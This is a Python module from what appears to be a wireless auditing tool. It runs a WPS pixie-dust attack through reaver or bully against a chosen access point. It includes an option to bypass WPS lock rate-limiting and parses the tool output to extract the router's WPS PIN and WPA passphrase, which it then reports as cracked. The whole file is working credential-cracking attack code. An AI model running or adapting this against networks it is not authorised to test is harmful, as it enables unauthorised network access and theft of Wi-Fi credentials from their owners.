# -*- coding: utf-8 -*-
"""WPS pixie-dust attack via reaver (bully fallback).

Unlike the old wifite scraper, this reads only the handful of decisive reaver /
bully lines — PIN, PSK, and the lock/timeout failures — which are stable across
tool versions.
"""
import os
import re
import select
import subprocess
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType


PIN_RE = re.compile(r"WPS PIN:\s*'?([0-9]{4,8})'?", re.I)
PSK_RE = re.compile(r"WPA PSK:\s*'([^']*)'", re.I)
FAIL_RE = re.compile(r"pin not found|pixie-?dust.*fail|failed to (?:associate|recover)",
                     re.I)
LOCK_RE = re.compile(r"rate limiting|WPS lock|AP (?:is )?locked|WARNING.*lock", re.I)


def _build_cmd(tool, mon, target, ignore_locks):
    bssid = target["bssid"]
    channel = str(target.get("channel") or "")
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-d", "-v", "3"]
        if channel:
            cmd += ["-c", channel]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
        return cmd
    # reaver: -K 1 = pixie-dust, -N no-nacks, -vv verbose
    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "1", "-N", "-vv"]
    if channel:
        cmd += ["-c", channel]
    if ignore_locks:
        cmd.append("-L")
    return cmd


def pixie(mon, target, req, emit, stop_flag):
    """Run a WPS pixie-dust attack on one target.

    Returns {"ok","psk","pin","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)

    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return {"ok": False, "essid": essid, "bssid": bssid}

    cmd = _build_cmd(tool, mon, target, ignore_locks)
    tools.log("wps pixie: %s" % " ".join(cmd))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, bufsize=1, text=True)
    except Exception as e:  # noqa: BLE001
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    pin = None
    psk = None
    result = {"ok": False, "essid": essid, "bssid": bssid}
    fd = proc.stdout.fileno()
    try:
        while True:
            if stop_flag and stop_flag.is_set():
                result["cancelled"] = True
                break
            if (time.time() - start) > timeout:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            m = PIN_RE.search(line)
            if m:
                pin = m.group(1)
            m = PSK_RE.search(line)
            if m:
                psk = m.group(1)
            if psk is not None or (pin and re.search(r"pixie", line, re.I)
                                   and "PIN" in line.upper()):
                cred = psk if psk is not None else pin
                emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                                 credential=cred))
                result = {"ok": True, "psk": psk, "pin": pin,
                          "essid": essid, "bssid": bssid}
                break
            if LOCK_RE.search(line) and not ignore_locks:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps lock"))
                break
            if FAIL_RE.search(line):
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pin"))
                break
            # Heartbeat for the live status screen (structured countdown).
            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase="PIXIE",
                             countdown=max(0, int(timeout - (time.time() - start))),
                             cd_max=timeout))
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass
    # A PIN with no PSK still counts as a crack (credential = pin).
    if not result["ok"] and pin and psk is None:
        emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                         credential=pin))
        result = {"ok": True, "psk": None, "pin": pin,
                  "essid": essid, "bssid": bssid}
    return result
